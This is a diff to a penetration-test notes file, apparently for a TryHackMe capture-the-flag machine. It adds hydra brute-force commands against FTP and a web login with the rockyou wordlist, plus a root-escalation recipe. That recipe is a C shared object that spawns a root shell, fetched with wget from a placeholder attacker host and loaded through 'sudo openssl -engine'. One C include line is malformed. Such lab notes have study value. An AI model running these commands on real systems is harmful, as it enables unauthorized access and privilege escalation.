@@ -81,8 +81,15 @@ gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password
 '''
 
 '''
-[21][ftp] host: 10.10.1.50   login: rcampbell   password: walter
-[21][ftp] host: 10.10.1.50   login: gcrawford   password: mandi
+hydra -l rcampbell -P /usr/share/wordlists/rockyou.txt ftp://10.10.198.108 -I
+hydra -l gcrawford -P /usr/share/wordlists/rockyou.txt ftp://10.10.198.108 -I
+'''
+
+'''
+http:80
+possible user: plague
+/backdoor
+hydra -IV -l plague -P /usr/share/wordlists/rockyou.txt -t 64 10.10.198.108 http-form-post "/api/login:username=^USER^&password=^PASS^:F=Incorrect" -I
 '''
 
 
@@ -102,6 +109,27 @@ getcap -r / 2>/dev/null
 python3 -c "import os, pty; os.setuid(0); pty.spawn('/bin/bash')"
 '''
 
+
+*as plague
+(on attacker make a .c file)
+'''
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib>
+
+void _init(){
+	setgid(0);
+	setuid(0);
+	system("/bin/sh");
+}
+'''
+(compile)
+gcc -fPIC -o up.so up.c -nostartfiles
+'''
+(on target)
+wget http://atacker/file.so
+sudo openssl req -engine ./up.so					
+'''
 
 					# interesting things
 
@@ -159,6 +187,7 @@ root
 gcrawford
 rcampbell
 tryhackme
+plague
 '''
 
 '''
@@ -166,7 +195,7 @@ tryhackme
 
 >passwds
 '''
-"I think these change for every new instance of the machine"
+"these change for every new instance of the machine"
 '''
 
 
@@ -174,6 +203,7 @@ tryhackme
 >files and dirs
 '''
 /usr/bin/python3
+openssl
 '''
 
 '''
